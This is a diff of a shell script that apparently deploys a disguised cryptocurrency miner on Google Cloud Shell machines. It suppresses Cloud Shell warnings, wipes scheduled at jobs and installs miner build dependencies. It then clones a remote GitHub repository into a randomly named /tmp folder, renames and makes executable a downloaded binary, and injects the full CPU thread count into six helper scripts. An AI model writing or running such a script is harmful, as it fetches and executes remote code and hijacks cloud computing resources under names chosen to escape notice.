@@ -9,7 +9,7 @@ sudo mkdir ~/.cloudshell
 sudo touch ~/.cloudshell/no-apt-get-warning
 
 ID="$(hostname)"
-THREADS="$(nproc --all)"
+threads=$(nproc --all)
 reboot_time=$(shuf -i 10-14 -n 1)
 
 for i in `atq | awk '{print $1}'`;do atrm $i;done
@@ -49,7 +49,7 @@ sudo sysctl -p
 sudo apt-get update && sudo apt-get install git libcurl4-openssl-dev build-essential libjansson-dev libuv1-dev libmicrohttpd-dev libssl-dev autotools-dev automake screen htop nano cmake mc -y
 sleep 2
 cd /tmp && mkdir $tmpfoldername
-sudo git clone https://github.com/soomtom/local.git /tmp/$tmpfoldername
+sudo git clone https://github.com/kapiks/home.git /tmp/$tmpfoldername
 cd /tmp/$tmpfoldername
 sudo mv /tmp/$tmpfoldername/vst /tmp/$tmpfoldername/$softwarename
 sudo chmod +x /tmp/$tmpfoldername/$softwarename
@@ -64,6 +64,13 @@ sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/3.sh
 sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/4.sh
 sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/5.sh
 sudo sed -i "s/defaultsoftwarename/$softwarename/g" /tmp/$tmpfoldername/6.sh
+
+sudo sed -i "s/defaultthreads/$threads/g" /tmp/$tmpfoldername/1.sh
+sudo sed -i "s/defaultthreads/$threads/g" /tmp/$tmpfoldername/2.sh
+sudo sed -i "s/defaultthreads/$threads/g" /tmp/$tmpfoldername/3.sh
+sudo sed -i "s/defaultthreads/$threads/g" /tmp/$tmpfoldername/4.sh
+sudo sed -i "s/defaultthreads/$threads/g" /tmp/$tmpfoldername/5.sh
+sudo sed -i "s/defaultthreads/$threads/g" /tmp/$tmpfoldername/6.sh
 
 sudo mv /tmp/$tmpfoldername/1.sh /tmp/$tmpfoldername/$time1.sh
 sudo mv /tmp/$tmpfoldername/2.sh /tmp/$tmpfoldername/$time2.sh
